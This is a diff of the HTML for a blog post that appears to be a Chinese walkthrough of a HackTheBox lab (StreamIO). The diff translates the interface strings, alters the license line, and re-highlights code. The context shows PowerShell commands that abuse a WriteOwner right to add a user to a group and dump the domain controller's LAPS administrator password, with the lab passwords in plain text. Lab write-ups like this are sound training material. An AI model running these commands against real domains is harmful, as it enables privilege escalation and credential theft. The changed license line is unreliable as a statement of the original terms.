@@ -154,7 +154,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="検索">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -374,7 +374,7 @@
             </figure>
 
 <h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="core-staff"><a href="#core-staff" class="headerlink" title="core staff"></a>core staff</h2><p>根据bloodhound的信息，JDgodd对core staff有WriteOwner权限，core staff有权限去获取laps密码，所以首先把JDgodd加到core staff组中：</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">upload PowerView.ps1</span><br><span class="line"><span class="built_in">Import-Module</span> .\PowerView.ps1</span><br><span class="line"></span><br><span class="line"><span class="variable">$SecPassword</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">'JDg0dd1s@d0p3cr3@t0r'</span> -AsPlainText -Force</span><br><span class="line"><span class="variable">$Cred</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="string">'streamio\JDgodd'</span>, <span class="variable">$SecPassword</span>)</span><br><span class="line">Add-DomainObjectAcl -Credential <span class="variable">$Cred</span> -TargetIdentity <span class="string">"Core Staff"</span> -principalidentity <span class="string">"streamio\JDgodd"</span></span><br><span class="line">Add-DomainGroupMember -identity <span class="string">"Core Staff"</span> -members <span class="string">"streamio\JDgodd"</span> -credential <span class="variable">$Cred</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">upload PowerView.ps1</span><br><span class="line"><span class="built_in">Import-Module</span> .\PowerView.ps1</span><br><span class="line"></span><br><span class="line"><span class="variable">$SecPassword</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">'JDg0dd1s@d0p3cr3@t0r'</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span></span><br><span class="line"><span class="variable">$Cred</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="string">'streamio\JDgodd'</span>, <span class="variable">$SecPassword</span>)</span><br><span class="line"><span class="built_in">Add-DomainObjectAcl</span> <span class="literal">-Credential</span> <span class="variable">$Cred</span> <span class="literal">-TargetIdentity</span> <span class="string">"Core Staff"</span> <span class="literal">-principalidentity</span> <span class="string">"streamio\JDgodd"</span></span><br><span class="line"><span class="built_in">Add-DomainGroupMember</span> <span class="literal">-identity</span> <span class="string">"Core Staff"</span> <span class="literal">-members</span> <span class="string">"streamio\JDgodd"</span> <span class="literal">-credential</span> <span class="variable">$Cred</span></span><br></pre></td></tr></table></figure>
 
 <h2 id="laps-password"><a href="#laps-password" class="headerlink" title="laps password"></a>laps password</h2><p> 现在可以使用JDgodd去获取laps密码：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install lapsdumper</span><br><span class="line"></span><br><span class="line">lapsdumper -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' -d streamio.htb</span><br><span class="line"><span class="meta">DC$</span><span class="bash">:j50th8dNh2(<span class="variable">$Ae</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 也可以继续使用powershell</span></span><br><span class="line"><span class="meta">$</span><span class="bash">Computers = Get-ADComputer -Credential <span class="variable">$Cred</span> -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime</span></span><br><span class="line"><span class="meta">$</span><span class="bash">Computers | Sort-Object ms-Mcs-AdmPwdExpirationTime | Format-Table -AutoSize Name, DnsHostName, ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime</span></span><br><span class="line"></span><br><span class="line">Name DnsHostName     ms-Mcs-AdmPwd  ms-Mcs-AdmPwdExpirationTime</span><br><span class="line">---- -----------     -------------  ---------------------------</span><br><span class="line">DC   DC.streamIO.htb j50th8dNh2($Ae          132997693606874315</span><br></pre></td></tr></table></figure>
@@ -407,7 +407,7 @@
     <div class="content">
         
 <span class="post-time">
-    最終更新：<time datetime="2022-09-19T00:53:20.966Z" itemprop="dateUpdated">2022-09-19 08:53:20</time>
+    Last updated: <time datetime="2022-09-19T00:53:20.966Z" itemprop="dateUpdated">2022-09-19 08:53:20</time>
 </span><br>
 
 
@@ -574,7 +574,7 @@
             
                 <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
             
-            <span>このブログの内容物は<a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.ja" target="_blank">クリエイティブ・コモンズ 表示 - 非営利 - 継承 4.0 国際ライセンスの下に提供されています</a></span>
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
         </p>
     </div>
     <div class="bottom">
